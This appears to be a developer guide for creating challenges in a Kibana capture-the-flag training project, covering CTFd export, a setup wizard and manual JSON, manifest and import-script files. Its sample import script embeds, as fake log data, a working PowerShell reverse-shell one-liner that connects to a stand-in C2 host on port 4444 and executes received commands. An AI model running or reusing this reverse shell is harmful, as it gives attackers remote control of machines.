# Instructions for Creating a New Challenge for the Kibana-CTF

## Overview
Creating a new challenge for the Kibana CTF involves setting up several files that define the challenge's details, flag, hints, and any necessary Elastic stack configurations. You can create challenges by exporting them from an existing CTFd instance, using an automated wizard, or manually. Follow the steps below to create a new challenge.

## Developer Options Overview
The setup script includes powerful developer options accessible via the main menu (option 5). These tools are designed to streamline challenge creation, management, and infrastructure operations:

```Text
=========================================================================================
        🔧 Developer Options for Creating, Exporting, and Testing Challenges 🛠️
=========================================================================================
What would you like to do?

[0] 🛠️ Create New CTF Challenge (Template / Wizard)
[1] 📥 Import CTF Challenge to CTFd and Elastic Stack
[2] 📦 Export Existing CTF Challenge (From CTFd)
[3] 🟢 Start Up Elastic Stack (Requires preconfigured docker setup with already imported challenges)
[4] 🔴 Shut Down Elastic Stack
[5] 🟢 Start Up CTFd (Requires preconfigured docker setup with already imported challenges)
[6] 🔴 Shut Down CTFd
[7] 🚦Check Elastic Stack and CTFd Status
[8] 🗑️ Delete CTFd
[9] 🗑️ Delete Elastic Stack

Q. Quit
```

- **Create New CTF Challenge (Wizard)**: Interactive tool to generate challenge files with guided prompts for name, category, description, points, flags, and optional hints or import scripts.
- **Import CTF Challenge**: Deploy specific challenges from the project repository into both CTFd and the Elastic Stack, including saved objects and data ingestion.
- **Export Existing CTF Challenge**: Extract challenges directly from a running CTFd instance, preserving all formatting and metadata, then integrate them into the project structure.
- **Start/Stop Elastic Stack**: Control the Docker-based Elasticsearch and Kibana deployment for development and testing.
- **Start/Stop CTFd**: Manage the CTFd platform deployment via Docker.
- **Check Status**: Verify the health and availability of both Elastic Stack and CTFd services.
- **Delete Services**: Completely remove CTFd or Elastic Stack deployments and associated data (destructive operations).

These options provide a comprehensive toolkit for challenge development, testing, and infrastructure management.

## Recommended Approach: Export from CTFd
For the best experience and to capture the authentic look and feel of your CTFd challenge, we highly recommend creating challenges directly in CTFd first, then exporting them using the developer options. This approach allows you to see exactly how the challenge will appear to participants and ensures all formatting and features are preserved.

### How to Export a Challenge from CTFd
1. Create your challenge natively in your CTFd instance using the web interface. Set up the description, points, flags, hints, and any other properties as you want them to appear.
2. Run the setup script (`Invoke-Kibana-CTF-Setup.ps1`).
3. Select the main menu option for "Developer Options" (option 5).
4. Choose "Export Existing CTF Challenge (From CTFd)" (option 2).
5. The script will query your CTFd instance and display all available challenges.
6. Select the challenge you want to export by entering its ID.
7. Choose the category for the challenge (Discover, ES_QL, Dashboards).
8. The script will automatically:
   - Export the challenge data to JSON files (`ctfd_challenge.json`, `ctfd_flag.json`, optional `ctfd_hint.json`).
   - Assign a new ID following the category-based scheme.
   - Create the challenge directory and manifest file.
9. Review and customize the exported files as needed (e.g., add Elastic import scripts or saved objects).
10. Import the challenge using the setup script.

### Alternative: Using the Developer Wizard
If you prefer to create challenges programmatically without first setting them up in CTFd, use the wizard approach. This is useful for rapid prototyping or when you have all the details ready.

### How to Use the Wizard
1. Run the setup script (`Invoke-Kibana-CTF-Setup.ps1`).
2. Select the main menu option for "Developer Options" (option 5).
3. Choose "Create New CTF Challenge (Template / Wizard)" (option 0).
4. Follow the interactive prompts to enter:
   - Challenge name
   - Category (e.g., Discover, ES_QL, Dashboards)
   - Description
   - Point value
   - Flag content
   - Optional hint
   - Whether to generate an advanced import script
5. The wizard will automatically:
   - Determine the next available challenge ID based on the category.
   - Create the challenge directory.
   - Generate the `challenge_manifest.psd1` file.
   - Create `ctfd_challenge.json`, `ctfd_flag.json`, and optional files like `ctfd_hint.json` or `elastic_import_script.ps1`.
6. Review and customize the generated files as needed.
7. Import the challenge using the setup script.

### Pros and Cons of Each Approach

#### Export from CTFd (Recommended)
**Pros:**
- Captures the exact look and feel from your CTFd instance.
- Preserves all formatting, images, and advanced features.
- No risk of JSON formatting errors.
- Allows testing the challenge in CTFd before exporting.
- Most authentic representation for participants.

**Cons:**
- Requires creating the challenge in CTFd first.
- Dependent on having a running CTFd instance.
- May need additional customization for Elastic components.

#### Wizard Approach
**Pros:**
- Quick and guided setup reduces time and errors.
- Automatically handles ID assignment and file structure.
- Ensures consistency across challenges.
- Generates all required files with proper formatting.
- Ideal for rapid prototyping.

**Cons:**
- Less flexibility for highly customized or complex challenges.
- Requires running the script in a PowerShell environment.
- May need manual tweaks for advanced scenarios.

#### Manual Approach
**Pros:**
- Full control over every detail and customization.
- Allows for advanced modifications not supported by automated tools.
- No dependency on the setup script or CTFd instance.
- Suitable for experienced users or unique challenge designs.

**Cons:**
- Time-consuming and prone to formatting or ID errors.
- Requires deep knowledge of file schemas and structures.
- Higher risk of inconsistencies.

## Manual Creation Process

### 1. Choose a Category and Challenge Number

#### Challenge ID Reference Cheat Sheet

To keep things consistent, all challenge IDs follow a **category-based scheme**. Use this as a quick lookup when creating new challenges:

| Category     | ID Range   | Example IDs   |
|--------------|------------|---------------|
| **Discover**   | `1000+`    | 1001, 1002, 1003 … |
| **ES\_QL**     | `2000+`    | 2001, 2002, 2003 … |
| **Dashboards** | `3000+`    | 3001, 3002, 3003 … |

👉 Each challenge, flag, and hint **must share the same ID** (e.g., Challenge 1001 → Flag 1001 → Hint 1001). If you need more than 1 flag or hint, add another digit at the end to the challenge ID and increment accordingly. Using the example above, the first hint ID would be 1001, and the second 10010, the third, 10011, etc.

Decide on a category for your challenge (e.g., Discover, ES|QL) and assign the next available number. This directory number is simply an easy way to see how many challenges are in a category. It is not used for anything else. The structure should look like this:
```
challenges/[category]/[number]/
```

or in practice:

```
challenges/Discover/11/
```

The key is making sure that the IDs for challenges, flags, hints, etc, are all unique. To determine the next available ID, you can look at the lastly created challenge's ID.

### 2. Create the Manifest File (Required)

Each challenge directory must contain a `challenge_manifest.psd1`, otherwise it won't be imported.  
This manifest declares which files belong to the challenge so the setup script can discover and import them automatically.

**Minimal requirements**
- `Name` — friendly display name for the challenge.  
- `RequiredFiles` — array of filenames that must exist in the challenge folder. At minimum include:
  - `ctfd_challenge.json`
  - `ctfd_flag.json`  
- Optional entries you may include in `RequiredFiles`: `ctfd_hint.json`, `elastic_import_script.ps1`, `elastic_saved_objects.ndjson`, etc.


**Schema:**
```powershell
@{
    Name = "Back to the basics"
    RequiredFiles = @(
        "ctfd_challenge.json"
        "ctfd_flag.json"
        # Optional:
        "ctfd_hint.json"
        "elastic_import_script.ps1"
        "elastic_saved_objects.ndjson"
    )
}
```

### 3. Create the ctfd_challenge.json File (Required)
Create a file named `ctfd_challenge.json` in the challenge directory. This file is required and contains all the metadata for your challenge in CTFd. The file must be a valid JSON object with the following fields:

| Field            | Type      | Description                                                                                   |
|------------------|-----------|-----------------------------------------------------------------------------------------------|
| id               | integer   | Unique challenge ID (must follow category-based scheme).                         |
| name             | string    | The title of the challenge.                                                                   |
| description      | string    | A detailed explanation of the challenge, can include Markdown and image links.                |
| max_attempts     | integer   | Maximum number of attempts allowed (0 for unlimited).                                         |
| value            | integer   | Points awarded for solving the challenge.                                                     |
| category         | string    | The category this challenge belongs to (e.g., "Discover", "ES|QL != SQL").                    |
| type             | string    | Challenge type, usually "standard".                                                           |
| state            | string    | Visibility state, usually "visible".                                                          |
| requirements     | object    | Prerequisites and anonymization settings.                                                     |
| connection_info  | string    | (Optional) URL or info needed to access the challenge.                                        |
| next_id          | integer   | (Optional) ID of the next challenge (if applicable).                                          |
| attribution      | string    | (Optional) Attribution or credits for the challenge.                                          |

**Example:**
```json
{
  "id": 1001,
  "name": "Back to the basics",
  "description": "Discover, where it all began. I had an awesome custom search/session saved for searching on host information, but can't find it. Maybe you can help me?\r\n\r\n![old_kibana.jpg](https://www.timroes.de/static/634d0811df5e7f971ebccf819aaecd9e/3f8aa/discover-columns.png)",
  "max_attempts": 0,
  "value": 10,
  "category": "(re)Discover",
  "type": "standard",
  "state": "visible",
  "requirements": {
    "prerequisites": [],
    "anonymize": true
  },
  "connection_info": "http://127.0.0.1:5601/s/kibana-ctf/app/discover",
  "next_id": null,
  "attribution": null
}
```

**Tip**

For a more UI driven experience for CTFd challenges, you can create the challenge in your CTFd instance then export the data (don't use CSV). Here are the docs to do this: https://docs.ctfd.io/docs/exports/ctfd-exports/

Once the files have been exported, you can extract the zipped files and peer into the json files and use them for the setup process. Note that this works with challenges, flags, and about any other aspect of CTFd.
![Export CTFd Files](/images/export_ctfd_files.png)

The last thing to note is that these are an array of all challenges, flags, etc., which means you need to break out each challenge from the array and place it into your challenge directory with the appropriate title.

### 4. Create the ctfd_flag.json File (Required)
Create a file named `ctfd_flag.json` in the challenge directory. This file should contain the actual flag that participants need to find. The format should be a JSON object with the following fields:

| Field         | Type     | Description                                                      |
|---------------|----------|------------------------------------------------------------------|
| id            | integer  | Unique flag ID (should match the challenge ID).                                                  |
| challenge_id  | integer  | The ID of the challenge this flag belongs to.                    |
| type          | string   | The flag type, usually "static".                                 |
| content       | string   | The flag value participants must submit.                         |
| data          | string   | Additional flag data, e.g., "case_insensitive".                  |

**Example:**
```json
{
  "id": 1001,
  "challenge_id": 1001,
  "type": "static",
  "content": "{ctf_one_search_to_rule_them_all}",
  "data": "case_insensitive"
}
```

**Tips**
- For flags, try and use some techniques such as encoding in hex or base 64 to prevent the {ctf_**} from easily being queried or searched for.
- Use the UI tip mentioned previously for when creating challenges using CTFd export feature!

### 5. (Optional) Create a Hint File
If you want to provide hints for your challenge, create a file named `ctfd_hint.json`. This file can help participants if they get stuck. The format should be a JSON object with the following fields:

| Field         | Type     | Description                                                      |
|---------------|----------|------------------------------------------------------------------|
| id            | integer  | Unique hint ID (should match the challenge ID).                                                  |
| type          | string   | Hint type, usually "standard".                                   |
| challenge_id  | integer  | The ID of the challenge this hint belongs to.                    |
| content       | string   | The hint text, can include Markdown and images.                  |
| cost          | integer  | The cost for viewing the hint (usually 0).                       |
| requirements  | object   | Prerequisites for viewing the hint.                              |

**Example:**
```json
{
  "id": 1001,
  "type": "standard",
  "challenge_id": 1001,
  "content": "Not the data!\n\n![](https://media1.giphy.com/media/qN9x0UIc0Rhg4/200w.gif?cid=6c09b952q6k3us6dh9m3dgek4fnqmti482nhgbfgmdk0r3mg&ep=v1_gifs_search&rid=200w.gif&ct=g)\n\nCheck out the saved search/session itself (not the queries, not the results).",
  "cost": 0,
  "requirements": {
    "prerequisites": []
  }
}
```

**Tip**

Use the UI tip mentioned previously for when creating challenges using CTFd export feature!

### 6. (Optional) Create an Elastic Import Script

If your challenge requires specific data to be set up in the Elastic stack, create a PowerShell script named `elastic_import_script.ps1` in the challenge directory. This script should define a function that builds the challenge data as a PowerShell object, converts it to JSON, and ingests it into Elasticsearch using the provided URL and helper functions.

**Key concepts:**
- Use `[PSCustomObject]` to build your event/log data.
- Include relevant fields such as `@timestamp`, `message`, `tags`, `host`, and `process`.
- Convert the object to JSON with `ConvertTo-Json`.
- Use a custom ingest URL for the challenge.
- Call a helper function (e.g., `Invoke-Ingest-Elasticsearch-Documents`) to send the data.

**Example:**
```powershell
function challenge {
    $dateNow = ($(Get-Date -AsUTC)).ToString("o")
    $challenge = [PSCustomObject]@{
        '@timestamp' = $dateNow
        message = "Just a regular event log, nothing to see here."
        tags = @("critical")
        host = [PSCustomObject]@{
            name = "not_nics_machine"
        }
        process = [PSCustomObject]@{
            name = "yams.exe"
            command_line = @'
            powershell -NoProfile -WindowStyle Hidden -Command "& {
            $host = 'not-a-malware-c2';
            $port = 4444;
            $secret_key_1 = "{ctf_flag_example}"
            $client = New-Object System.Net.Sockets.TCPClient($host, $port);
            $stream = $client.GetStream();
            [byte[]]$buffer = New-Object byte[] 1024;
            while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead);
                $result = iex $data 2>&1 | Out-String;
                $response = (New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($result);
                $stream.Write($response, 0, $response.Length);
                $stream.Flush();
            }
            $client.Close();
'@
        }
    } | ConvertTo-Json
    $ingestIndexIDURL = $Elasticsearch_URL+"/logs-kibana-ctf/_create/e2N0Zl93b3dfbmljZV9qb2JfZmluZGluZ190aGlzX2N1c3RvbV9pZH0"

    $result = Invoke-Ingest-Elasticsearch-Documents -documentToIngest $challenge -customUrl $ingestIndexIDURL

    return Write-Host "Challenge 5 imported." -ForegroundColor Green
}
```

**Tips:**
- Adjust the fields and values to fit your challenge scenario.
- Make sure to use the correct index and document ID for your challenge.
- Use secrets or flags in the data as needed

### 7. (Optional) Create Saved Objects File

If your challenge requires saved objects in the Elastic stack (such as saved searches, index patterns, or ES|QL queries), create a file named `elastic_saved_objects.ndjson` in the challenge directory. This file should contain one or more newline-delimited JSON (NDJSON) objects, each representing a saved object to be imported into Kibana.

**Key concepts:**
- Each line in the file is a separate JSON object.
- Saved objects can include index patterns, searches, queries, visualizations, etc.
- Use Kibana's export feature to generate these objects (Recommended!), or build them manually if needed.
- You may include references to flags or challenge data within the saved object fields.

**Example:**
```jsonl
{"attributes":{"allowHidden":false,"fieldAttrs":"{\"@timestamp\":{\"count\":2}}","fieldFormatMap":"{}","fields":"[]","name":"logs-*(ctf)","runtimeFieldMap":"{}","sourceFilters":"[]","timeFieldName":"@timestamp","title":"logs-*"},"coreMigrationVersion":"8.8.0","created_at":"2025-01-19T18:45:57.472Z","id":"86402b2c-31dd-4ded-8628-2418eaf3e445","managed":false,"references":[],"type":"index-pattern","typeMigrationVersion":"8.0.0","updated_at":"2025-01-19T19:13:43.345Z","updated_by":"u_hSeY4x75rHYs6UkRYEMwXq0BbaHhEaxeNrNVNtL632w_0","version":"WzI0NTMsMTRd"}
{"attributes":{"columns":["host.name","host.ip","host.os.name","host.os.type","host.os.version"],"description":"This search/session allows for quick and easy access to looking at some host information across the logs-* data stream.\n\nHere I am!\n{ctf_one_search_to_rule_them_all}","grid":{},"hideChart":false,"isTextBasedQuery":false,"kibanaSavedObjectMeta":{"searchSourceJSON":"{\"query\":{\"query\":\"host.* : *\",\"language\":\"kuery\"},\"filter\":[],\"indexRefName\":\"kibanaSavedObjectMeta.searchSourceJSON.index\"}"},"sort":[["@timestamp","desc"]],"timeRestore":false,"title":"[Host Info] Details"},"coreMigrationVersion":"8.8.0","created_at":"2025-01-19T18:45:57.472Z","id":"7a8a6fd9-7f55-4a48-a418-19ff7a97c96c","managed":false,"originId":"121536f2-427a-46a5-a4d0a6650d9764ca","references":[{"id":"86402b2c-31dd-4ded-8628-2418eaf3e445","name":"kibanaSavedObjectMeta.searchSourceJSON.index","type":"index-pattern"}],"type":"search","typeMigrationVersion":"10.5.0","updated_at":"2025-01-19T19:14:55.453Z","updated_by":"u_hSeY4x75rHYs6UkRYEMwXq0BbaHhEaxeNrNVNtL632w_0","version":"WzI0NTcsMTRd"}
```

**Tips:**
- Use NDJSON format for compatibility with Kibana's import/export tools.
- Include flags or clues in the description or other fields if relevant to the challenge.
- Saved objects can be imported using Kibana's UI or API.

By including saved objects, you can provide participants with pre-built searches, dashboards, or queries that are essential for solving your challenge.

### 8. Finalize Your Challenge
Once all files are created, ensure they are correctly formatted and placed in the appropriate directory structure. Test your challenge to verify that it works as intended within the CTF environment.

**Test the Setup:**  
Run the setup script and select the option to import challenges.  
Verify your new challenge appears in CTFd and Kibana, and works as expected.

**Tip:**  
To test importing of challenges over and over, it makes most sense to delete the challenges before re-importing since the script doesn't update any already imported challenges and instead fails to import because the challenge already exists.

Use the [Resetting the Instance](https://docs.ctfd.io/tutorials/configuration/resetting-a-ctfd-instance/) docs to delete **just** the challenges before importing already imported challenges.

✨To import a single challenge without re-running the full setup process, use the Developer Options menu (option 5) and select "Import CTF Challenge to CTFd and Elastic Stack" (option 1). This allows you to quickly test and validate individual challenges without affecting the rest of your CTF environment.

---

## Conclusion
By following these steps, you can create a new challenge for the Kibana CTF using the recommended export from CTFd approach for the most authentic experience, the wizard for quick setup, or manual creation for full customization. Make sure to test your challenge thoroughly and consider sharing it with the community!

With the manifest model, the setup script will automatically:  
- Discover your challenge  
- Validate the required files  
- Import it into CTFd and Kibana  

✅ This makes challenge creation simpler, cleaner, and much easier to share with the community.  
🚩 Now go build something fun and keep those flags hidden well — happy hunting!